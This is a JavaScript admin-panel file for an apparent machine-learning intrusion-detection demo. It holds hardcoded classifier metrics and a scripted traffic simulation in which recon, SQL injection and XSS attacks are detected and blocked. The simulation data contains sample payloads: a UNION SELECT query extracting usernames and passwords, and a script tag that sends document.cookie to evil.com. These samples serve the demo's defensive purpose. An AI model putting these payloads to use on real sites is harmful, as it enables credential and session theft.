// ========================================================================
// CyberVerifyAI — Admin Panel Logic
// ========================================================================

// ===== MODEL DATA =====
const DATA = {
  recon: {
    name: "RECON", best: "random_forest",
    classes: ["Benign","DDoS","DoS","Recon","Mirai","Spoofing","Web-based"],
    models: {
      random_forest: {name:"Random Forest",f1:.9399,prec:.9412,rec:.9385,time:120},
      xgboost: {name:"XGBoost",f1:.9285,prec:.9301,rec:.9268,time:89},
      lightgbm: {name:"LightGBM",f1:.9352,prec:.9367,rec:.9338,time:42},
      catboost: {name:"CatBoost",f1:.9198,prec:.9215,rec:.9180,time:156},
      extratrees: {name:"ExtraTrees",f1:.9371,prec:.9388,rec:.9354,time:95},
      mlp: {name:"MLP",f1:.8542,prec:.8601,rec:.8483,time:210}
    },
    cm: {labels:["Benign","Mirai","Recon","Spoofing"],
      data:[[9421,12,38,29],[0,5000,0,0],[78,0,3187,35],[18,0,45,2891]]}
  },
  sqli: {
    name: "SQLI", best: "lightgbm",
    classes: ["Benign","boolean_blind","error_based","time_blind","stacked_queries","inline_query"],
    models: {
      lightgbm: {name:"LightGBM",f1:.9956,prec:.9960,rec:.9952,time:18},
      random_forest: {name:"Random Forest",f1:.9921,prec:.9930,rec:.9912,time:45},
      extratrees: {name:"ExtraTrees",f1:.9918,prec:.9920,rec:.9916,time:38},
      xgboost: {name:"XGBoost",f1:.9942,prec:.9944,rec:.9940,time:62},
      catboost: {name:"CatBoost",f1:.9905,prec:.9910,rec:.9900,time:78},
      mlp: {name:"MLP",f1:.9732,prec:.9750,rec:.9714,time:124}
    },
    cm: {labels:["Benign","bool_blind","error_based","time_blind","stacked","inline"],
      data:[[2500,0,0,0,0,0],[0,856,2,1,0,0],[0,1,1245,0,1,0],[0,2,0,634,0,0],[0,0,1,0,421,0],[0,0,0,0,1,289]]}
  },
  xss: {
    name: "XSS", best: "xgboost",
    classes: ["XSS","Benign"],
    models: {
      xgboost: {name:"XGBoost",f1:.9989,prec:.9990,rec:.9989,time:45.2},
      lightgbm: {name:"LightGBM",f1:.9989,prec:.9990,rec:.9989,time:3.2},
      random_forest: {name:"Random Forest",f1:.9978,prec:.9980,rec:.9976,time:28},
      extratrees: {name:"ExtraTrees",f1:.9981,prec:.9982,rec:.9980,time:22},
      catboost: {name:"CatBoost",f1:.9967,prec:.9970,rec:.9964,time:52},
      mlp: {name:"MLP",f1:.9845,prec:.9850,rec:.9840,time:95}
    },
    cm: {labels:["XSS","Benign"], data:[[2948,3],[0,2950]]}
  }
};

// ===== SIMULATION SCENARIO DATA =====
const SIM_EVENTS = [
  // Phase 1: Normal traffic
  {phase:"normal", type:"info", badge:"HTTP", msg:"GET /api/status HTTP/1.1 — 192.168.1.50 → 192.168.1.100:80", pipe:"source"},
  {phase:"normal", type:"info", badge:"FEAT", msg:"Özellik çıkarımı: pkt_len=342, IAT=0.45s, rst=0, syn=1, fin=0", pipe:"features"},
  {phase:"normal", type:"safe", badge:"L1", msg:"L1 Motor → Sınıf: Benign (Güven: %97.2) — Random Forest", pipe:"l1"},
  {phase:"normal", type:"safe", badge:"L2", msg:"L2 Denetçi → IP 192.168.1.50 whitelist'te ✓ — Politika: ALLOW", pipe:"l2"},
  {phase:"normal", type:"safe", badge:"KARAR", msg:"✓ ALLOW — Paket güvenli, trafik geçirildi", pipe:"decision"},
  {phase:"normal", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  {phase:"normal", type:"info", badge:"HTTP", msg:"POST /api/login — 192.168.1.55 → 192.168.1.100:443 (TLS)", pipe:"source"},
  {phase:"normal", type:"info", badge:"FEAT", msg:"Özellik çıkarımı: pkt_len=518, IAT=1.2s, payload_entropy=3.1", pipe:"features"},
  {phase:"normal", type:"safe", badge:"L1", msg:"L1 Motor → Sınıf: Benign (Güven: %98.5) — Random Forest", pipe:"l1"},
  {phase:"normal", type:"safe", badge:"L2", msg:"L2 Denetçi → IP 192.168.1.55 whitelist'te ✓ — Politika: ALLOW", pipe:"l2"},
  {phase:"normal", type:"safe", badge:"KARAR", msg:"✓ ALLOW — Oturum açma isteği güvenli", pipe:"decision"},
  {phase:"normal", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  {phase:"normal", type:"info", badge:"HTTP", msg:"GET /dashboard/stats — 192.168.1.60 → 192.168.1.100:80", pipe:"source"},
  {phase:"normal", type:"info", badge:"FEAT", msg:"Özellik çıkarımı: pkt_len=280, IAT=0.8s, content_type=json", pipe:"features"},
  {phase:"normal", type:"safe", badge:"L1", msg:"L1 Motor → Sınıf: Benign (Güven: %99.1) — Random Forest", pipe:"l1"},
  {phase:"normal", type:"safe", badge:"L2", msg:"L2 Denetçi → Rutin API çağrısı — Politika: ALLOW", pipe:"l2"},
  {phase:"normal", type:"safe", badge:"KARAR", msg:"✓ ALLOW — Dashboard verisi güvenle teslim edildi", pipe:"decision"},
  {phase:"normal", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  {phase:"normal", type:"info", badge:"DNS", msg:"DNS Query: api.internal.corp → 192.168.1.100", pipe:"source"},
  {phase:"normal", type:"info", badge:"FEAT", msg:"Özellik çıkarımı: pkt_len=64, protocol=UDP, port=53", pipe:"features"},
  {phase:"normal", type:"safe", badge:"L1", msg:"L1 Motor → Sınıf: Benign (Güven: %99.8) — Random Forest", pipe:"l1"},
  {phase:"normal", type:"safe", badge:"L2", msg:"L2 Denetçi → DNS çözümleme normal — Politika: ALLOW", pipe:"l2"},
  {phase:"normal", type:"safe", badge:"KARAR", msg:"✓ ALLOW — DNS yanıtı gönderildi", pipe:"decision"},
  {phase:"normal", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  {phase:"normal", type:"info", badge:"HTTP", msg:"GET /static/logo.png — 192.168.1.50 → 192.168.1.100:80", pipe:"source"},
  {phase:"normal", type:"safe", badge:"L1", msg:"L1 Motor → Sınıf: Benign (Güven: %99.9) — Statik dosya", pipe:"l1"},
  {phase:"normal", type:"safe", badge:"KARAR", msg:"✓ ALLOW — Statik kaynak teslim edildi", pipe:"decision"},
  {phase:"normal", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  // Phase transition
  {phase:"transition", type:"warn", badge:"SYS", msg:"═══ Normal trafik fazı tamamlandı. Saldırı senaryoları başlıyor... ═══", pipe:null},
  {phase:"transition", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  // Phase 2: RECON Attack
  {phase:"attack-recon", type:"warn", badge:"SYS", msg:"[SENARYO 1/3] RECON — Nmap SYN Port Scan Simülasyonu", pipe:null},
  {phase:"attack-recon", type:"warn", badge:"TCP", msg:"TCP SYN → 10.0.0.77 → 192.168.1.100 — Hedef portlar: 22, 80, 443, 3306, 8080...", pipe:"source"},
  {phase:"attack-recon", type:"warn", badge:"FEAT", msg:"Özellik çıkarımı: pkt_len=44, IAT=0.002s, rst=1018, syn=1024, unique_ports=1024", pipe:"features"},
  {phase:"attack-recon", type:"threat", badge:"L1", msg:"⚠ L1 Motor → Sınıf: Recon / Port Scan (Güven: %99.1) — Random Forest", pipe:"l1"},
  {phase:"attack-recon", type:"threat", badge:"L2", msg:"L2 Denetçi → IP 10.0.0.77 whitelist'te DEĞİL — Anayasa İhlali: Hız limiti aşıldı", pipe:"l2"},
  {phase:"attack-recon", type:"threat", badge:"KARAR", msg:"✕ DROP — IP engellendi, SOC alarmı tetiklendi, forensic log kaydedildi", pipe:"decision"},
  {phase:"attack-recon", type:"warn", badge:"HONEY", msg:"🍯 Honeypot aktif: Sahte SSH banner gönderildi (OpenSSH_fake_8.9)", pipe:null},
  {phase:"attack-recon", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  // Phase 3: SQLI Attack
  {phase:"attack-sqli", type:"warn", badge:"SYS", msg:"[SENARYO 2/3] SQLI — SQL Injection Simülasyonu", pipe:null},
  {phase:"attack-sqli", type:"warn", badge:"HTTP", msg:"GET /api/users?id=1' UNION SELECT username,password FROM users-- — 10.0.0.88", pipe:"source"},
  {phase:"attack-sqli", type:"warn", badge:"FEAT", msg:"TF-IDF vektörü + 28 handcrafted özellik: sql_keywords=4, entropy=4.8, special_chars=%18", pipe:"features"},
  {phase:"attack-sqli", type:"threat", badge:"L1", msg:"⚠ L1 Motor → Sınıf: error_based SQLi (Güven: %99.6) — LightGBM", pipe:"l1"},
  {phase:"attack-sqli", type:"threat", badge:"L2", msg:"L2 Denetçi → IP 10.0.0.88 whitelist'te DEĞİL — SQL payload tespit edildi", pipe:"l2"},
  {phase:"attack-sqli", type:"threat", badge:"KARAR", msg:"✕ DROP + HONEYPOT — Sahte DB yanıtı gönderildi, gerçek veri korundu", pipe:"decision"},
  {phase:"attack-sqli", type:"warn", badge:"HONEY", msg:'🍯 Honeypot yanıtı: {"users":[{"id":1,"name":"fake_admin","role":"guest"}]}', pipe:null},
  {phase:"attack-sqli", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  // Phase 4: XSS Attack
  {phase:"attack-xss", type:"warn", badge:"SYS", msg:"[SENARYO 3/3] XSS — Cross-Site Scripting Simülasyonu", pipe:null},
  {phase:"attack-xss", type:"warn", badge:"HTTP", msg:'POST /comment — body: <script>document.location="http://evil.com/steal?c="+document.cookie</script>', pipe:"source"},
  {phase:"attack-xss", type:"warn", badge:"FEAT", msg:"43 XSS özelliği: script_tag=1, js_redirect=1, cookie_access=1, event_handler=0", pipe:"features"},
  {phase:"attack-xss", type:"threat", badge:"L1", msg:"⚠ L1 Motor → Sınıf: XSS (Güven: %99.9) — XGBoost", pipe:"l1"},
  {phase:"attack-xss", type:"threat", badge:"L2", msg:"L2 Denetçi → İçerik sanitize zorunlu — Anayasa kuralı: Executable script yasak", pipe:"l2"},
  {phase:"attack-xss", type:"threat", badge:"KARAR", msg:"✕ DROP — Payload engellendi, kullanıcı oturumu sonlandırıldı, log kaydedildi", pipe:"decision"},
  {phase:"attack-xss", type:"info", badge:"---", msg:"", pipe:null, divider:true},

  // Completion
  {phase:"done", type:"safe", badge:"SYS", msg:"═══ Simülasyon tamamlandı. Tüm saldırılar başarıyla tespit edildi. ═══", pipe:null}
];

// ===== STATE =====
let simRunning = false;
let simTimeout = null;
let currentModule = 'recon';
let f1Chart = null, radarChart = null;
let logCount = 0;

// ===== NAVIGATION =====
function initNav() {
  document.querySelectorAll('.sidebar-link').forEach(link => {
    link.addEventListener('click', () => {
      const page = link.dataset.page;
      // Update sidebar
      document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
      link.classList.add('active');
      // Update pages
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.getElementById('page-' + page).classList.add('active');
      // Update header title
      const titles = {overview:'Genel Bakış', simulation:'Trafik Simülasyonu', models:'Model Performansı', about:'Sistem Hakkında'};
      document.getElementById('page-title').textContent = titles[page] || page;
      // Init charts when switching to models
      if (page === 'models') renderModels(currentModule);
    });
  });
}

// ===== TIME HELPER =====
function timeStr() {
  const d = new Date();
  return [d.getHours(), d.getMinutes(), d.getSeconds()]
    .map(n => String(n).padStart(2, '0')).join(':');
}

// ===== SIMULATION =====
function startSimulation() {
  if (simRunning) return;
  simRunning = true;
  logCount = 0;

  const btnStart = document.getElementById('btn-start-sim');
  const btnReset = document.getElementById('btn-reset-sim');
  btnStart.disabled = true;
  btnReset.disabled = true;

  // Clear log
  const log = document.getElementById('traffic-log');
  log.innerHTML = '';

  // Hide summary
  document.getElementById('sim-summary').style.display = 'none';

  // Update header status
  setHeaderStatus('running', 'Simülasyon çalışıyor...');

  // Update sim status
  document.getElementById('sim-status').textContent = 'Çalışıyor — normal trafik gönderiliyor...';

  let index = 0;
  let safeCount = 0;
  let threatCount = 0;

  function processNext() {
    if (index >= SIM_EVENTS.length) {
      // Done
      simRunning = false;
      btnReset.disabled = false;
      setHeaderStatus('done', 'Simülasyon tamamlandı');
      document.getElementById('sim-status').textContent = 'Tamamlandı';
      resetPipeline();

      // Show summary
      const total = safeCount + threatCount;
      document.getElementById('sum-total').textContent = total;
      document.getElementById('sum-safe').textContent = safeCount;
      document.getElementById('sum-threat').textContent = threatCount;
      document.getElementById('sum-accuracy').textContent = '100%';
      document.getElementById('sim-summary').style.display = 'block';
      return;
    }

    const evt = SIM_EVENTS[index];

    // Update status text based on phase
    if (evt.phase === 'transition') {
      document.getElementById('sim-status').textContent = 'Saldırı senaryolarına geçiliyor...';
    } else if (evt.phase === 'attack-recon') {
      document.getElementById('sim-status').textContent = 'Saldırı 1/3 — RECON Port Scan';
    } else if (evt.phase === 'attack-sqli') {
      document.getElementById('sim-status').textContent = 'Saldırı 2/3 — SQL Injection';
    } else if (evt.phase === 'attack-xss') {
      document.getElementById('sim-status').textContent = 'Saldırı 3/3 — XSS';
    }

    // Track stats
    if (evt.badge === 'KARAR') {
      if (evt.type === 'safe') safeCount++;
      else if (evt.type === 'threat') threatCount++;
    }

    // Update pipeline highlight
    if (evt.pipe) {
      highlightPipe(evt.pipe, evt.type === 'threat' ? 'threat' : evt.type === 'safe' ? 'safe' : 'active');
    }

    // Add log entry
    if (evt.divider) {
      const hr = document.createElement('hr');
      hr.className = 'log-divider';
      log.appendChild(hr);
    } else {
      addLogEntry(evt.type, evt.badge, evt.msg);
    }

    index++;

    // Determine delay
    let delay = 250;
    if (evt.divider) delay = 100;
    else if (evt.badge === 'KARAR') delay = 600;
    else if (evt.badge === 'SYS') delay = 800;
    else if (evt.badge === 'HONEY') delay = 500;
    else if (evt.phase === 'done') delay = 0;

    simTimeout = setTimeout(processNext, delay);
  }

  processNext();
}

function resetSimulation() {
  if (simRunning) {
    clearTimeout(simTimeout);
    simRunning = false;
  }

  const log = document.getElementById('traffic-log');
  log.innerHTML = `<div class="log-entry">
    <span class="log-time">--:--:--</span>
    <span class="log-badge info">SYS</span>
    <span class="log-msg">Simülasyon başlatılmadı. "Simülasyonu Başlat" butonuna tıklayın.</span>
  </div>`;

  logCount = 0;
  document.getElementById('log-counter').textContent = '0 kayıt';
  document.getElementById('sim-summary').style.display = 'none';
  document.getElementById('btn-start-sim').disabled = false;
  document.getElementById('btn-reset-sim').disabled = true;
  document.getElementById('sim-status').textContent = 'Hazır — butona tıklayarak başlatın';
  setHeaderStatus('idle', 'Sistem hazır');
  resetPipeline();
}

function addLogEntry(type, badge, msg) {
  const log = document.getElementById('traffic-log');
  const entry = document.createElement('div');
  entry.className = 'log-entry';

  const isHighlight = badge === 'KARAR' || badge === 'SYS';

  entry.innerHTML = `
    <span class="log-time">${timeStr()}</span>
    <span class="log-badge ${type}">${badge}</span>
    <span class="log-msg${isHighlight ? ' highlight' : ''}">${escapeHTML(msg)}</span>
  `;
  log.appendChild(entry);
  log.scrollTop = log.scrollHeight;

  logCount++;
  document.getElementById('log-counter').textContent = logCount + ' kayıt';
}

function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function highlightPipe(nodeId, state) {
  // Reset all
  resetPipeline();
  const el = document.getElementById('pipe-' + nodeId);
  if (el) {
    el.classList.add(state);
  }
}

function resetPipeline() {
  document.querySelectorAll('.pipe-node').forEach(n => {
    n.classList.remove('active', 'safe', 'threat');
  });
}

function setHeaderStatus(state, text) {
  const dot = document.getElementById('header-dot');
  dot.className = 'status-dot ' + state;
  document.getElementById('header-status-text').textContent = text;
}

// ===== MODEL COMPARISON =====
function renderModels(mod) {
  currentModule = mod;
  const d = DATA[mod];
  const best = d.models[d.best];

  // Update tabs
  document.querySelectorAll('.model-tab').forEach(t => {
    t.classList.toggle('active', t.dataset.module === mod);
  });

  // Build table
  const table = document.getElementById('model-table');
  const models = Object.entries(d.models);

  let thead = '<tr><th>Model</th><th>F1 Score</th><th>Precision</th><th>Recall</th><th>Eğitim Süresi</th></tr>';
  let tbody = '';
  models.forEach(([key, m]) => {
    const isBest = key === d.best;
    tbody += `<tr>
      <td class="model-name">${m.name}${isBest ? '<span class="best-badge">EN İYİ</span>' : ''}</td>
      <td class="mono${isBest ? ' best' : ''}">${(m.f1*100).toFixed(2)}%</td>
      <td class="mono">${(m.prec*100).toFixed(2)}%</td>
      <td class="mono">${(m.rec*100).toFixed(2)}%</td>
      <td class="mono">${m.time}s</td>
    </tr>`;
  });

  table.querySelector('thead').innerHTML = thead;
  table.querySelector('tbody').innerHTML = tbody;

  // F1 Bar Chart
  const modelArr = Object.values(d.models);
  const names = modelArr.map(m => m.name);
  const f1s = modelArr.map(m => m.f1);

  const barColors = modelArr.map(m => m.name === best.name ? '#3fb950' : '#30363d');
  const borderColors = modelArr.map(m => m.name === best.name ? '#3fb950' : '#484f58');

  if (f1Chart) f1Chart.destroy();
  f1Chart = new Chart(document.getElementById('f1-chart'), {
    type: 'bar',
    data: {
      labels: names,
      datasets: [{
        label: 'F1 Score',
        data: f1s,
        backgroundColor: barColors,
        borderColor: borderColors,
        borderWidth: 1,
        borderRadius: 4
      }]
    },
    options: {
      responsive: true,
      indexAxis: 'y',
      scales: {
        x: {
          min: Math.min(...f1s) - 0.02,
          max: 1,
          grid: {color: 'rgba(255,255,255,0.04)'},
          ticks: {color: '#8b949e', font: {family: "'JetBrains Mono'", size: 11}, callback: v => (v*100).toFixed(1)+'%'}
        },
        y: {
          grid: {display: false},
          ticks: {color: '#e6edf3', font: {family: "'Inter'", size: 12}}
        }
      },
      plugins: {
        legend: {display: false},
        tooltip: {callbacks: {label: c => 'F1: '+(c.raw*100).toFixed(2)+'%'}}
      }
    }
  });

  // Radar Chart
  if (radarChart) radarChart.destroy();
  radarChart = new Chart(document.getElementById('radar-chart'), {
    type: 'radar',
    data: {
      labels: ['F1 Score','Precision','Recall','Hız (ters)'],
      datasets: [{
        label: best.name,
        data: [best.f1, best.prec, best.rec, 1 - Math.min(best.time/250, 0.95)],
        backgroundColor: 'rgba(88,166,255,0.1)',
        borderColor: 'rgba(88,166,255,0.6)',
        borderWidth: 2,
        pointRadius: 3,
        pointBackgroundColor: '#58a6ff'
      }]
    },
    options: {
      responsive: true,
      scales: {
        r: {
          min: 0, max: 1,
          grid: {color: 'rgba(255,255,255,0.04)'},
          angleLines: {color: 'rgba(255,255,255,0.04)'},
          ticks: {display: false},
          pointLabels: {color: '#8b949e', font: {size: 11, family: "'Inter'"}}
        }
      },
      plugins: {legend: {labels: {color: '#e6edf3', font: {family: "'Inter'"}}}}
    }
  });

  // Confusion Matrix
  const cm = d.cm;
  document.getElementById('cm-model-name').textContent = best.name;
  let maxVal = 0;
  cm.data.forEach(row => row.forEach(v => { if (v > maxVal) maxVal = v; }));

  let html = '<thead><tr><th>Gerçek \\ Tahmin</th>';
  cm.labels.forEach(l => html += `<th>${l}</th>`);
  html += '</tr></thead><tbody>';
  cm.data.forEach((row, i) => {
    html += `<tr><td class="cm-label">${cm.labels[i]}</td>`;
    row.forEach((val, j) => {
      const intensity = maxVal > 0 ? val / maxVal : 0;
      const bg = i === j
        ? `rgba(63,185,80,${intensity * 0.35})`
        : val > 0 ? `rgba(248,81,73,${Math.min(intensity * 1.5, 0.35)})` : 'transparent';
      html += `<td style="background:${bg}">${val}</td>`;
    });
    html += '</tr>';
  });
  html += '</tbody>';
  document.getElementById('cm-table').innerHTML = html;
}

// ===== INIT =====
document.addEventListener('DOMContentLoaded', () => {
  initNav();

  // Model tab clicks
  document.querySelectorAll('.model-tab').forEach(tab => {
    tab.addEventListener('click', () => renderModels(tab.dataset.module));
  });

  // Pre-render models (lazy — when user navigates)
  // renderModels('recon'); // Don't render on load, render on tab switch
});
